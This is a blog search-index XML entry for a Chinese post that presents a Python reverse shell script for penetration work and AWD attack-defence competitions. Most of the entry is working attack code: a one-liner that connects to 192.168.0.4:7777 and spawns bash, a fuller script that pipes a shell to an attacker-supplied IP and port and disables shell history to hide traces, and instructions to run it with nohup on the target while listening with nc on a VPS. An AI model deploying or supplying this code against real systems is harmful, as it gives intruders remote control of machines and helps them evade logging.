<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>linux反弹shell脚本的分析</title>
    <url>/2019/10/21/linux%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>linux的反弹shell脚本，实战，awd都可使用，代码来自原Google安全团队，在目标机运行下面python代码，nohup python shell.py (your ip) (your port) &amp; 在vps进行监听，nc -lvp 5555</p><a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> sys,os,socket,pty</span><br><span class="line">shell = <span class="string">"/bin/bash"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'python reverse connector'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'usage: %s &lt;ip_addr&gt; &lt;port&gt;'</span> % name)         <span class="comment">#使用 输入ip地址 端口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) !=<span class="number">3</span>:</span><br><span class="line">        usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit()                                      <span class="comment">#如果shell输入不是ip 端口 输出当前路径&lt;ip_addr&gt; &lt;port&gt; 正常退出</span></span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <span class="comment">#创建TCP Socket</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>])))       <span class="comment"># 连接到指定ip地址，端口处的套接字</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'connect ok'</span>)                            <span class="comment">#不报错输出connect ok</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'connect failed'</span>)                        <span class="comment">#出错输出connect failed</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">0</span>)                               <span class="comment">#os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程</span></span><br><span class="line">    os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">global</span> shell</span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILE"</span>)                             <span class="comment">#环境变量的设置语法高亮</span></span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTORY"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSAVE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTZONE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTLOG"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTCMD"</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
</search>
